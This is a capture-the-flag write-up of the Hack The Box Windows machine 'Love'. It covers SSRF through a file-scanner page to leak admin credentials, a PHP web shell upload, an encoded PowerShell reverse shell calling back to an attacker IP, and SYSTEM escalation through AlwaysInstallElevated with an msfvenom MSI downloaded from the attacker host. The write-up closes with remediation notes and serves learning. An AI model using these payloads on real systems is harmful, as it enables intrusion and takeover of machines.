# HTB: Love

**Difficulty:** Easy  
**OS:** Windows  
**Target IP:** 10.129.48.103  
**Attacker IP:** 10.10.15.146  

## 1. Reconnaissance

### Port Scanning

I started with a fast port sweep using RustScan to quickly identify open ports on the target.
```bash
rustscan -a 10.129.48.103
```
**Results:**
```
Open 10.129.48.103:80
Open 10.129.48.103:135
Open 10.129.48.103:139
Open 10.129.48.103:445
Open 10.129.48.103:443
Open 10.129.48.103:3306
Open 10.129.48.103:5000
Open 10.129.48.103:5040
Open 10.129.48.103:7680
Open 10.129.48.103:47001
Open 10.129.48.103:49664
...
```

With the open ports identified, I followed up with a detailed service scan using Nmap.
```bash
nmap -sCV -T4 -p $(cat ports | awk -F ":" '{print $2}' | tr '\n' "," | sed 's/,$//') 10.129.48.103 -oA nmap/nmap
```
**Results:**
```
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
|_  Not valid before: 2021-01-18T14:00:16
445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp  open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
Service Info: Hosts: love.htb, LOVE, www.love.htb; OS: Windows
```

The scan reveals multiple interesting services:
- **Port 80**: Apache web server (love.htb)
- **Port 443**: HTTPS with a certificate revealing `staging.love.htb`
- **Port 445**: SMB (Windows 10 Pro)
- **Port 5000**: Another Apache server (403 Forbidden)
- **Port 3306**: MySQL (MariaDB)

The SSL certificate gives us a crucial hostname: `staging.love.htb`. I added both `love.htb` and `staging.love.htb` to `/etc/hosts`:
```bash
echo "10.129.48.103 love.htb staging.love.htb" >> /etc/hosts
```

## 2. Web Enumeration — love.htb

### 2.1 Initial Discovery

Browsing to `http://love.htb` shows a voting system application. I performed content discovery on the main site:
```bash
ffuf -u http://love.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -e .php,.html,.cgi,.php5 -mc 200,301,302,303,403 -fs 4388
```
**Results:**
```
.html                   [Status: 403]
images                  [Status: 301]
home.php                [Status: 302]
login.php               [Status: 302]
admin                   [Status: 301]
plugins                 [Status: 301]
includes                [Status: 301]
logout.php              [Status: 302]
preview.php             [Status: 302]
dist                    [Status: 301]
```

The site appears to be a voting/candidate management system with an admin panel at `/admin`.

### 2.2 Exploring `includes/ballot_modal.php`

Visiting `http://love.htb/includes/ballot_modal.php` revealed a PHP error:
```
Notice: Undefined variable: voter in C:\xampp\htdocs\omrs\includes\ballot_modal.php on line 50
Notice: Undefined variable: conn in C:\xampp\htdocs\omrs\includes\ballot_modal.php on line 52
Fatal error: Uncaught Error: Call to a member function query() on null
```

This error reveals several key pieces of information:
- The web root is `C:\xampp\htdocs\omrs\`
- The application uses MySQL (`query()` method call)
- The site is running on Windows with XAMPP

## 3. Web Enumeration — staging.love.htb

### 3.1 Content Discovery on Staging

I ran a separate directory scan on the staging subdomain:
```bash
ffuf -u http://staging.love.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-lowercase-2.3-medium.txt -e .php,.html,.cgi,.php5 -mc 200,301,302,303 -fs 5357
```
**Results:**
```
beta.php                [Status: 200, Size: 4997]
```

### 3.2 The File Scanner — Local File Inclusion (LFI)

`http://staging.love.htb/beta.php` presents a "Free File Scanner" tool that accepts a URL to "scan" a file. The page source shows:
```html
<form name="fileform" method=post action="/beta.php" onsubmit="return validateForm()">
    <input class="input" type="text" name=file placeholder="File to scan">
    <input type=submit name=read value="Scan file">
</form>
```

Testing it with a local file path:
```
POST /beta.php
file=http://127.0.0.1/
```

Submitting `http://127.0.0.1/` returned the HTML source of the main site (`love.htb`). This indicates the scanner is retrieving and displaying the content of the URL provided — a classic Local File Inclusion (LFI) / Server-Side Request Forgery (SSRF) vulnerability.

### 3.3 Abusing the SSRF to Access Port 5000

Since port 5000 was open and was returning a 403 on direct access, I used the scanner to access it internally:
```
POST /beta.php
file=http://127.0.0.1:5000/
```

This returned the source code of the application running on port 5000, which contained the admin credentials for the voting system:
```html
Vote Admin Creds admin: @LoveIsInTheAir!!!!
```

✅ Credentials obtained: `admin:@LoveIsInTheAir!!!!`

### 3.4 Confirming the SSRF

Submitting `http://My-IP/` to the scanner made it reach back to my Kali machine:
```bash
python3 -m http.server 80
10.129.48.103 - - [24/Aug/2026 23:28:24] "GET / HTTP/1.1" 200 -
```

This confirms the server can make outbound HTTP requests, which will be useful later.

## 4. Foothold — Admin Access

### 4.1 Logging into the Voting System

Using the credentials `admin:@LoveIsInTheAir!!!!` at `http://love.htb/admin/home.php` successfully logged me into the admin panel.

### 4.2 Uploading a Reverse Shell

The admin panel allows creating voters and candidates. The candidate creation form accepts an image upload. Since I could upload arbitrary files, I created a PHP reverse shell and uploaded it as a candidate's "photo".

**Shell file (`shell.php`):**
```php
<?php system($_GET['cmd']); ?>
```

After uploading, the file was saved to `http://love.htb/images/shell.php`.

### 4.3 Testing RCE

```bash
curl http://love.htb/images/shell.php?cmd=whoami
```
**Output:**
```
love\phoebe
```

✅ Remote code execution confirmed as user `phoebe`.

### 4.4 Getting a Reverse Shell

I used a PowerShell reverse shell payload (base64 encoded) to get a proper interactive session:
```bash
curl -G 'http://love.htb/images/shell.php' \
  --data-urlencode 'cmd=powershell -e JABFAHIAcgBvAHIAVgBpAGUAdwA9ACIATgBvAHIAbQBhAGwAVgBpAGUAdwAiADsAJABFAHIAcgBvAHIAQQBjAHQAaQBvAG4AUAByAGUAZgBlAHIAZQBuAGMAZQA9ACIAQwBvAG4AdABpAG4AdQBlACIAOwAkAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQA0ADYAIgAsADkAMAAwADEAKQA7ACQAcwA9ACQAYwAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAPQAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAPQAkAHMALgBSAGUAYQBkACgAJABiACwAMAAsACQAYgAuAEwAZQBuAGcAdABoACkAKQAtAG4AZQAwACkAewAkAGQAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiACwAMAAsACQAaQApADsAdAByAHkAewAkAG8APQBpAGUAeAAgACQAZAAgADIAPgAmADEAIAAzAD4AJgAxACAANAA+ACYAMQAgADUAPgAmADEAIAA2AD4AJgAxAHwATwB1AHQALQBTAHQAcgBpAG4AZwB9AGMAYQB0AGMAaAB7ACQAbwA9ACQAXwB8AE8AdQB0AC0AUwB0AHIAaQBuAGcAfQBpAGYAKABbAHMAdAByAGkAbgBnAF0AOgA6AEkAcwBOAHUAbABsAE8AcgBFAG0AcAB0AHkAKAAkAG8AKQApAHsAJABvAD0AIgAiAH0AJABwAD0AIgBQAFMAIAAiACsAKABwAHcAZAApAC4AUABhAHQAaAArACIAPgAgACIAOwBbAGIAeQB0AGUAWwBdAF0AJABzAGIAPQAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbwArACQAcAApADsAJABzAC4AVwByAGkAdABlACgAJABzAGIALAAwACwAJABzAGIALgBMAGUAbgBnAHQAaAApADsAJABzAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAC4AQwBsAG8AcwBlACgAKQA='
```

Starting the listener:
```bash
rlwrap nc -lvnp 9001
```
**Connection received:**
```
connect to [10.10.15.146] from (UNKNOWN) [10.129.48.103] 61647
whoami
love\phoebe
PS C:\xampp\htdocs\omrs\images>
```

✅ Foothold obtained as `phoebe`.

## 5. Privilege Escalation

### 5.1 AlwaysInstallElevated Registry Key

I checked for common Windows privilege escalation vectors. The `AlwaysInstallElevated` registry key controls whether Windows Installer (.msi) files run with SYSTEM privileges.
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
**Output:**
```
HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```

The key exists and is set to `1`, meaning any .msi file installed will run with SYSTEM privileges. I also checked HKCU:
```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
This key was also present and set to `1`. With both keys enabled, I could escalate to SYSTEM.

### 5.2 Checking AppLocker Restrictions

Before generating a payload, I checked AppLocker policies to ensure the .msi would execute:
```powershell
Get-AppLockerPolicy -Effective | Select-Object -ExpandProperty RuleCollections
```
**Relevant rules:**
```
PathConditions : {*.*}
Action         : Allow
UserOrGroupSid : S-1-5-32-544 (Administrators)

PathConditions : {%OSDRIVE%\Administration\*}
Action         : Allow
UserOrGroupSid : S-1-5-21-... (Specific user)

PathConditions : {%OSDRIVE%\*}
Action         : Deny
UserOrGroupSid : S-1-1-0 (Everyone)
```

Interestingly, AppLocker:
- Allows Administrators to run any .msi file (`*.*`)
- Allows a specific user to run .msi from `%OSDRIVE%\Administration\*`
- Denies everyone from running .msi from the root of the OS drive

This means I need to place my .msi in the `C:\Administration\` directory.

### 5.3 Creating and Serving a Malicious MSI

I generated a reverse shell MSI payload using msfvenom:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.15.146 LPORT=4444 -f msi -o reverse.msi
```

Served it via HTTP:
```bash
python3 -m http.server 8000
```

### 5.4 Downloading and Executing on Target

From the `phoebe` shell, I downloaded the MSI to the allowed directory:
```powershell
wget http://10.10.15.146:8000/reverse.msi -O C:\Administration\reverse.msi
```

Then installed it with the `msiexec` command, using the `/quiet` flag to bypass any UI prompts:
```powershell
msiexec /quiet /i C:\Administration\reverse.msi
```

### 5.5 SYSTEM Shell

On my Kali machine, I started another listener:
```bash
rlwrap nc -lvnp 4444
```
**Connection received:**
```
connect to [10.10.15.146] from (UNKNOWN) [10.129.48.103] 61649
Microsoft Windows [Version 10.0.19042.867]
C:\WINDOWS\system32>whoami
nt authority\system
```

✅ Root access obtained — `NT AUTHORITY\SYSTEM`.

## 6. Summary

| Stage | Technique |
|---|---|
| Recon | `rustscan` + `nmap` → Multiple open ports including 80, 443, 445, 5000, 3306; discovered `staging.love.htb` from SSL certificate |
| Web Enumeration | Found an LFI/SSRF vulnerability on `staging.love.htb/beta.php` via a "file scanner" feature |
| SSRF Exploitation | Used the SSRF to access internal port 5000, retrieving plaintext admin credentials for the voting system |
| Foothold | Logged into the admin panel at `love.htb/admin/`, uploaded a PHP reverse shell as a candidate image, gained RCE as `phoebe` |
| Privilege Escalation | Found `AlwaysInstallElevated` registry keys set to `1`; generated a malicious .msi, downloaded it to `C:\Administration\`, and installed it to get a SYSTEM shell |

**Root cause / lessons learned:**

- **SSRF via file scanner**: The "file scanner" feature on `staging.love.htb` blindly fetches user-supplied URLs, allowing access to internal services (port 5000). Applications should validate and restrict URLs to prevent SSRF attacks.
- **Hardcoded credentials**: Admin credentials were stored in plaintext on port 5000. Credentials should never be hardcoded in source code or configuration files.
- **Insecure file upload**: The voting system allowed arbitrary file uploads (PHP shell) disguised as an image. Server-side validation (file type, content, etc.) is essential.
- **AlwaysInstallElevated misconfiguration**: This registry key, when enabled, allows any user to install .msi files with SYSTEM privileges, leading to easy privilege escalation. This should be disabled via Group Policy.

## 7. Tools Used

- `rustscan`, `nmap` — reconnaissance
- `ffuf` — content discovery on both `love.htb` and `staging.love.htb`
- Manual SSRF/LFI testing — accessing internal services and files
- `curl`, `python3 -m http.server` — payload delivery and testing
- `msfvenom` — generating reverse shell MSI payload
- `rlwrap`, `nc` — catching reverse shells
- `reg query` — checking `AlwaysInstallElevated` registry key
- `Get-AppLockerPolicy` — checking AppLocker restrictions
- `wget` (PowerShell) — downloading payload from attacker machine
- `msiexec` — installing the malicious MSI with SYSTEM privileges
